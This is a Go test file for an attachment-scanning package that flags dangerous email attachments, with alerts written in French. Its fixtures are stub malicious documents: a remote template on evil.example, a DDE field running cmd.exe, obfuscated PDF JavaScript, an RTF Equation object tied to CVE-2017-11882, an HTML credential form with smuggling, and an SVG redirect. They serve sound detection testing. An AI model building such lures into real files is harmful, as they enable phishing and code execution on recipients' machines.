package filecheck

import (
	"archive/zip"
	"bytes"
	"encoding/binary"
	"strings"
	"testing"

	"github.com/get-code-ch/mailtoolkit_webserver/internal/testcfb"
)

type zipFile struct {
	name      string
	content   string
	encrypted bool
}

func buildZip(t *testing.T, files ...zipFile) []byte {
	t.Helper()
	var b bytes.Buffer
	w := zip.NewWriter(&b)
	for _, f := range files {
		header := &zip.FileHeader{Name: f.name, Method: zip.Deflate}
		if f.encrypted {
			header.Flags |= 0x1
		}
		fw, err := w.CreateHeader(header)
		if err != nil {
			t.Fatal(err)
		}
		fw.Write([]byte(f.content))
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return b.Bytes()
}

// biffRecord encodes a BIFF8 record.
func biffRecord(recordType uint16, body []byte) []byte {
	record := make([]byte, 4, 4+len(body))
	binary.LittleEndian.PutUint16(record, recordType)
	binary.LittleEndian.PutUint16(record[2:], uint16(len(body)))
	return append(record, body...)
}

// boundSheet encodes a BoundSheet8 record (hidden state, sheet type).
func boundSheet(name string, hidden, sheetType byte) []byte {
	body := []byte{0, 0, 0, 0, hidden, sheetType, byte(len(name)), 0}
	return biffRecord(0x0085, append(body, name...))
}

func workbook(sheets ...[]byte) []byte {
	stream := biffRecord(0x0809, make([]byte, 16)) // BOF
	for _, s := range sheets {
		stream = append(stream, s...)
	}
	return append(stream, biffRecord(0x000A, nil)...) // EOF
}

const contentTypes = `<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>`

func remoteTemplateRels(target string) string {
	return `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">` +
		`<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="` + target + `" TargetMode="External"/>` +
		`<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/" TargetMode="External"/>` +
		`</Relationships>`
}

func TestAnalyze(t *testing.T) {
	pe := append([]byte("MZ\x90\x00"), make([]byte, 60)...)
	iso := make([]byte, 0x8010)
	copy(iso[0x8001:], "CD001")
	png := []byte("\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR")

	tests := []struct {
		name  string
		data  []byte
		kind  string
		level string
		// alerts are substrings expected in the alert messages.
		alerts []string
	}{
		{"photo.png", png, "Image PNG", "", nil},
		{"notes.txt", []byte("Bonjour,\nvoici mes notes.\n"), "Texte", "", nil},
		{"setup.exe", pe, "Exécutable Windows (PE)", LevelDanger, []string{"Programme exécutable"}},
		{"facture.pdf", pe, "Exécutable Windows (PE)", LevelDanger, []string{"ne correspond pas au contenu réel"}},
		{"facture.pdf.exe", pe, "", LevelDanger, []string{"Double extension « .pdf.exe »"}},
		{"facture\u202Efdp.exe", pe, "", LevelDanger, []string{"inversion du sens d'écriture", "la vraie est .exe"}},
		{"rapport.pdf          .js", []byte("var x = 1;"), "", LevelDanger, []string{"Double extension", "Extension .js"}},
		{"photo.png.", png, "Image PNG", LevelWarning, []string{"se termine par des points"}},
		{"invoice.lnk", []byte("L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F"), "Raccourci Windows (.lnk)", LevelDanger, []string{"Raccourci"}},
		{"scan.iso", iso, "Image disque ISO", LevelDanger, []string{"Image disque"}},
		{"archive.rar", []byte("Rar!\x1a\x07\x00rest"), "Archive RAR", LevelWarning, []string{"n'est pas inspecté"}},

		// Office 97-2003
		{"lettre.doc", testcfb.Build(testcfb.Stream("WordDocument", []byte("w")),
			testcfb.Storage("Macros", testcfb.Storage("VBA", testcfb.Stream("dir", []byte("d"))))),
			"Document Word 97-2003", LevelDanger, []string{"macros VBA"}},
		{"compta.xls", testcfb.Build(testcfb.Stream("Workbook", workbook(boundSheet("Feuil1", 0, 0), boundSheet("Macro1", 2, 1)))),
			"Classeur Excel 97-2003", LevelDanger, []string{"Excel 4.0 (XLM)", "très masquée"}},
		{"budget.xls", testcfb.Build(testcfb.Stream("Workbook", workbook(boundSheet("Feuil1", 0, 0)))),
			"Classeur Excel 97-2003", "", nil},
		{"objet.doc", testcfb.Build(testcfb.Stream("WordDocument", []byte("w")),
			testcfb.Storage("ObjectPool", testcfb.Storage("_123", testcfb.Stream("\x01Ole10Native", []byte("MZ"))))),
			"Document Word 97-2003", LevelWarning, []string{"objet embarqué"}},
		{"secret.docx", testcfb.Build(testcfb.Stream("EncryptionInfo", []byte("e")), testcfb.Stream("EncryptedPackage", []byte("p"))),
			"Document Office chiffré", LevelWarning, []string{"protégé par mot de passe"}},
		{"message.msg", testcfb.Build(testcfb.Stream("__substg1.0_0037001F", []byte("s\x00"))),
			"Message Outlook (.msg)", "", nil},
		{"broken.doc", append(append([]byte{}, testcfb.Build()[:8]...), make([]byte, 600)...),
			"Document Office 97-2003 (OLE)", LevelWarning, []string{"endommagé"}},

		// Office 2007+ and other ZIP based formats
		{"offre.docm", buildZip(t, zipFile{name: "[Content_Types].xml", content: contentTypes}, zipFile{name: "word/document.xml", content: "<w:document/>"},
			zipFile{name: "word/vbaProject.bin", content: "x"}),
			"Document Word", LevelDanger, []string{"macros VBA", "Extension .docm"}},
		{"cv.docx", buildZip(t, zipFile{name: "[Content_Types].xml", content: contentTypes}, zipFile{name: "word/document.xml", content: "<w:document/>"},
			zipFile{name: "word/_rels/settings.xml.rels", content: remoteTemplateRels("http://evil.example/t.dotm")}),
			"Document Word", LevelDanger, []string{"élément distant (attachedTemplate) : http://evil.example/t.dotm"}},
		{"dde.docx", buildZip(t, zipFile{name: "[Content_Types].xml", content: contentTypes},
			zipFile{name: "word/document.xml", content: `<w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText>`}),
			"Document Word", LevelDanger, []string{"champ DDE"}},
		{"stats.xlsx", buildZip(t, zipFile{name: "[Content_Types].xml", content: contentTypes}, zipFile{name: "xl/workbook.xml", content: "<workbook/>"},
			zipFile{name: "xl/macrosheets/sheet1.xml", content: "<xm:macrosheet/>"}, zipFile{name: "xl/activeX/activeX1.xml", content: "<ax/>"}),
			"Classeur Excel", LevelDanger, []string{"Excel 4.0", "ActiveX"}},
		{"clean.docx", buildZip(t, zipFile{name: "[Content_Types].xml", content: contentTypes}, zipFile{name: "word/document.xml", content: "<w:document/>"},
			zipFile{name: "word/_rels/document.xml.rels", content: strings.Replace(remoteTemplateRels("x"), "attachedTemplate", "image", 1)}),
			"Document Word", LevelWarning, []string{"ressource externe (image)"}},
		{"texte.odt", buildZip(t, zipFile{name: "mimetype", content: "application/vnd.oasis.opendocument.text"}, zipFile{name: "Basic/Standard/Module1.xml", content: "<m/>"}),
			"Document OpenDocument", LevelDanger, []string{"LibreOffice Basic"}},
		{"outil.jar", buildZip(t, zipFile{name: "META-INF/MANIFEST.MF", content: "Main-Class: A"}, zipFile{name: "A.class", content: "\xca\xfe\xba\xbe"}),
			"Programme Java (.jar)", LevelDanger, []string{"Java"}},
		{"documents.zip", buildZip(t, zipFile{name: "dossier/", content: ""}, zipFile{name: "dossier/facture.pdf.js", content: "x"},
			zipFile{name: "photos.zip", content: "PK"}, zipFile{name: "budget.xlsm", content: "x"}),
			"Archive ZIP", LevelDanger, []string{"« dossier/facture.pdf.js »", "budget.xlsm", "d'autres archives"}},
		{"protected.zip", buildZip(t, zipFile{name: "doc.pdf", content: "x", encrypted: true}),
			"Archive ZIP", LevelWarning, []string{"protégée par mot de passe"}},

		// PDF, RTF, HTML, SVG
		{"facture.pdf", []byte("%PDF-1.7\n1 0 obj << /Type /Catalog /OpenAction 2 0 R /AcroForm 3 0 R >>\n2 0 obj << /S /J#61vaScript /JS (app.alert(1)) >>\n" +
			"4 0 obj << /A << /URI (https://a.example) >> >> << /URI (https://b.example) >>"),
			"Document PDF", LevelDanger, []string{"JavaScript", "action automatique", "formulaire", "2 liens"}},
		{"simple.pdf", []byte("%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >>"), "Document PDF", "", nil},
		{"commande.rtf", []byte(`{\rtf1{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 0105}}}`),
			"Document RTF", LevelDanger, []string{"mis à jour automatiquement", "CVE-2017-11882"}},
		{"commande.doc", []byte(`{\rtf1{\object{\*\objdata 0105}}}`),
			"Document RTF", LevelDanger, []string{"objet embarqué", "ne correspond pas au contenu réel : Document RTF"}},
		{"connexion.html", []byte(`<html><body><form action="https://evil.example"><input type="password"></form><script>var b = new Blob([atob("TVo=")])</script></body></html>`),
			"Page HTML", LevelDanger, []string{"Page web jointe", "JavaScript", "formulaire", "HTML smuggling"}},
		{"logo.svg", []byte(`<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="location.href='https://evil.example'"><rect/></svg>`),
			"Image vectorielle SVG", LevelDanger, []string{"événements", "Redirige"}},
		{"plain.svg", []byte(`<svg xmlns="http://www.w3.org/2000/svg"><rect width="1"/></svg>`), "Image vectorielle SVG", "", nil},
		{"original.eml", []byte("Received: from x\r\nFrom: a@example.com\r\nSubject: hi\r\n\r\nbody"), "Message électronique", "", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := Analyze(tt.name, "application/octet-stream", tt.data)
			if tt.kind != "" && r.Kind != tt.kind {
				t.Errorf("kind = %q, want %q", r.Kind, tt.kind)
			}
			if r.Level() != tt.level {
				t.Errorf("level = %q, want %q (alerts %+v)", r.Level(), tt.level, r.Alerts)
			}
			for _, want := range tt.alerts {
				found := false
				for _, a := range r.Alerts {
					found = found || strings.Contains(a.Message, want)
				}
				if !found {
					t.Errorf("no alert containing %q in %+v", want, r.Alerts)
				}
			}
			for i := 1; i < len(r.Alerts); i++ {
				if severity(r.Alerts[i-1].Level) > severity(r.Alerts[i].Level) {
					t.Errorf("alerts not sorted by severity: %+v", r.Alerts)
				}
			}
		})
	}
}

func TestAnalyzeHashesAndEntries(t *testing.T) {
	r := Analyze("abc.txt", "text/plain", []byte("abc"))
	if r.SHA256 != "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad" ||
		r.SHA1 != "a9993e364706816aba3e25717850c26c9cd0d89d" || r.MD5 != "900150983cd24fb0d6963f7d28e17f72" || r.Size != 3 {
		t.Errorf("hashes = %+v", r)
	}

	var files []zipFile
	for i := range maxEntries + 5 {
		files = append(files, zipFile{name: strings.Repeat("f", i+1) + ".txt", content: "x"})
	}
	r = Analyze("many.zip", "application/zip", buildZip(t, files...))
	if len(r.Entries) != maxEntries+1 || r.Entries[maxEntries] != "…" || r.Entries[0] != "f.txt" {
		t.Errorf("%d entries listed, last %q", len(r.Entries), r.Entries[len(r.Entries)-1])
	}
}

func TestDecodePDFName(t *testing.T) {
	for name, want := range map[string]string{"J#61vaScript": "JavaScript", "#4A#53": "JS", "Open#": "Open#", "A#zz": "A#zz"} {
		if got := decodePDFName(name); got != want {
			t.Errorf("decodePDFName(%q) = %q, want %q", name, got, want)
		}
	}
}
